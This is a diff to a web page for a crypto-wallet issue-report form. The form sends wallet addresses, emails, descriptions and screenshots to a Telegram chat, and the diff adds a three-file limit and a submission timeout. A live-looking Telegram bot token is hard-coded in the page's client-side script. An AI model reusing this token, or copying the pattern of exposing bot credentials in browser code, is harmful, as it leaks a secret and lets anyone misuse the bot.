@@ -208,6 +208,13 @@
       cursor: pointer;
     }
 
+    .file-input-info {
+      margin-top: 8px;
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+      text-align: center;
+    }
+
     .preview-container {
       display: none;
       gap: 15px;
@@ -284,6 +291,18 @@
       align-items: center;
       justify-content: center;
       gap: 10px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .timeout-bar {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      height: 4px;
+      background: var(--success);
+      width: 0%;
+      transition: width 1s linear;
     }
 
     button:hover {
@@ -509,7 +528,9 @@
                 <span>Click to upload or drag and drop</span>
               </div>
             </div>
+            <div class="file-input-info">Maximum 3 files allowed</div>
             <div id="screenshotError" class="validation-error">Please attach at least one screenshot</div>
+            <div id="screenshotLimitError" class="validation-error">Maximum 3 files allowed</div>
           </div>
 
           <div id="imagePreview" class="preview-container"></div>
@@ -517,6 +538,7 @@
           <button type="submit" id="submitButton">
             <i class="fas fa-paper-plane"></i>
             Submit Issue Report
+            <div class="timeout-bar" id="timeoutBar"></div>
           </button>
         </form>
 
@@ -551,11 +573,18 @@
     const issueTextarea = document.getElementById('issue');
     const charCounter = document.getElementById('charCounter');
     const submitButton = document.getElementById('submitButton');
+    const timeoutBar = document.getElementById('timeoutBar');
     const walletError = document.getElementById('walletError');
     const emailError = document.getElementById('emailError');
     const issueTypeError = document.getElementById('issueTypeError');
     const issueError = document.getElementById('issueError');
     const screenshotError = document.getElementById('screenshotError');
+    const screenshotLimitError = document.getElementById('screenshotLimitError');
+
+    // Variables for submission timeout
+    let submissionTimeout;
+    let timeoutInterval;
+    const TIMEOUT_DURATION = 60000; // 1 minute in milliseconds
 
     // Replace these with your actual bot token and chat ID
     const BOT_TOKEN = '7529157623:AAFNTTESufdig5oXH8zY0yEvHK2aNci5TCc';
@@ -575,8 +604,21 @@
       }
     });
 
-    // Handle image preview
+    // Handle image preview with 3 file limit
     screenshotInput.addEventListener('change', function(e) {
+      // Check if more than 3 files are selected
+      if (this.files.length > 3) {
+        screenshotLimitError.style.display = 'block';
+        // Keep only the first 3 files
+        const dt = new DataTransfer();
+        for (let i = 0; i < 3; i++) {
+          dt.items.add(this.files[i]);
+        }
+        this.files = dt.files;
+      } else {
+        screenshotLimitError.style.display = 'none';
+      }
+      
       imagePreview.innerHTML = '';
       
       if (this.files.length > 0) {
@@ -638,6 +680,40 @@
       return emailRegex.test(email);
     }
 
+    // Start submission timeout
+    function startSubmissionTimeout() {
+      let timeLeft = TIMEOUT_DURATION;
+      timeoutBar.style.width = '100%';
+      
+      // Clear any existing timeout
+      clearTimeout(submissionTimeout);
+      clearInterval(timeoutInterval);
+      
+      submissionTimeout = setTimeout(() => {
+        submitButton.disabled = false;
+        showStatusMessage("Submission timed out. Please try again.", "error");
+        timeoutBar.style.width = '0%';
+      }, TIMEOUT_DURATION);
+      
+      // Update progress bar
+      timeoutInterval = setInterval(() => {
+        timeLeft -= 100;
+        const percentage = (timeLeft / TIMEOUT_DURATION) * 100;
+        timeoutBar.style.width = `${percentage}%`;
+        
+        if (timeLeft <= 0) {
+          clearInterval(timeoutInterval);
+        }
+      }, 100);
+    }
+
+    // Cancel submission timeout
+    function cancelSubmissionTimeout() {
+      clearTimeout(submissionTimeout);
+      clearInterval(timeoutInterval);
+      timeoutBar.style.width = '0%';
+    }
+
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       
@@ -647,6 +723,7 @@
       issueTypeError.style.display = 'none';
       issueError.style.display = 'none';
       screenshotError.style.display = 'none';
+      screenshotLimitError.style.display = 'none';
       
       const wallet = form.walletAddress.value.trim();
       const email = form.email.value.trim();
@@ -686,6 +763,12 @@
         isValid = false;
       }
       
+      // Validate screenshot limit
+      if (screenshots.length > 3) {
+        screenshotLimitError.style.display = 'block';
+        isValid = false;
+      }
+      
       if (!isValid) {
         showStatusMessage("Please fix the errors in the form.", "error");
         return;
@@ -693,6 +776,9 @@
 
       submitButton.disabled = true;
       showStatusMessage("Sending your report...", "sending");
+      
+      // Start the submission timeout
+      startSubmissionTimeout();
 
       try {
         // First send the text message
@@ -716,9 +802,10 @@
           throw new Error(textResult.description || 'Failed to send message');
         }
 
-        // Then send each screenshot if any
+        // Then send each screenshot if any (up to 3)
         if (screenshots.length > 0) {
-          for (let i = 0; i < screenshots.length; i++) {
+          const maxFiles = Math.min(screenshots.length, 3); // Ensure we only process up to 3 files
+          for (let i = 0; i < maxFiles; i++) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', screenshots[i]);
@@ -736,7 +823,10 @@
           }
         }
 
-        showStatusMessage("Issue reported successfully! Our team will contact you shortly. Please check your spam folder", "success");
+        // Cancel timeout as submission was successful
+        cancelSubmissionTimeout();
+        
+        showStatusMessage("Issue reported successfully! Our team will contact you shortly.", "success");
         form.reset();
         imagePreview.innerHTML = '';
         imagePreview.style.display = 'none';
@@ -744,6 +834,9 @@
         charCounter.className = "char-count";
 
       } catch (error) {
+        // Cancel timeout as submission failed
+        cancelSubmissionTimeout();
+        
         console.error(error);
         showStatusMessage("Failed to send report. Please try again later.", "error");
       } finally {
@@ -803,7 +896,20 @@
       fileInputButton.style.backgroundColor = '';
       
       if (e.dataTransfer.files.length) {
-        fileInput.files = e.dataTransfer.files;
+        // Check if more than 3 files are dropped
+        if (e.dataTransfer.files.length > 3) {
+          screenshotLimitError.style.display = 'block';
+          // Keep only the first 3 files
+          const dt = new DataTransfer();
+          for (let i = 0; i < 3; i++) {
+            dt.items.add(e.dataTransfer.files[i]);
+          }
+          fileInput.files = dt.files;
+        } else {
+          fileInput.files = e.dataTransfer.files;
+          screenshotLimitError.style.display = 'none';
+        }
+        
         const event = new Event('change', { bubbles: true });
         fileInput.dispatchEvent(event);
       }
